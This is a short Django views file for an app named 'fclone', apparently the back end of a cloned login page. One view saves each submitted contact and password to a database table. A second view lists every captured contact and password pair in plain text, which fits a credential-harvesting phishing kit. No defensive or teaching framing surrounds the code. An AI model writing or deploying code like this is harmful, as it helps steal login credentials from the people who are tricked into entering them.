from django.shortcuts import render
from django.http import HttpResponse

from fclone.models import LoginRecord
from .forms import LogiForm

from django.shortcuts import render
from .forms import LogiForm

def login(request):
    if request.method == "POST":
        form = LogiForm(request.POST)
        if form.is_valid():
            form.save()  # Automatically saves to the database
            return render(request, 'login.html')  # Redirect to success page
    else:
        form = LogiForm()
    return render(request, 'login.html', {'form': form})




def display_data(request):
    # Query the LoginRecord table and extract contact and password fields
    data_lines = list(LoginRecord.objects.values_list('contact', 'password'))

    # If no records exist, display a placeholder message
    if not data_lines:
        data_lines = [["No data available yet."]]

    return render(request, 'display_data.html', {'data_lines': data_lines})




